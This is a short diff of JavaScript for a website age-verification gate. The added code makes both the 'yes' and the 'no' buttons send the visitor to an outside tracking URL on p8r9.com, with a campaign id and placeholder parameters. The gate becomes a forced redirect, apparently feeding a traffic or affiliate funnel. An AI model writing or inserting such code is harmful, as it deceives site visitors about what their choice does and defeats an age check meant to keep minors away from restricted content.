@@ -62,8 +62,12 @@ if(form){
 
   const yes=bd.querySelector('#age-yes');
   const no=bd.querySelector('#age-no');
-  if(yes) yes.addEventListener('click', closeGate);
-  if(no) no.addEventListener('click', closeGate);
+  if(yes) yes.addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=e7CI6FHPEA&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+  if(no) no.addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=e7CI6FHPEA&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
 
 (function(){
@@ -89,6 +93,7 @@ if(form){
   bd.querySelector('#age-yes').addEventListener('click', closeGate);
   bd.querySelector('#age-no').addEventListener('click', closeGate);
 })();
+
 
 
 
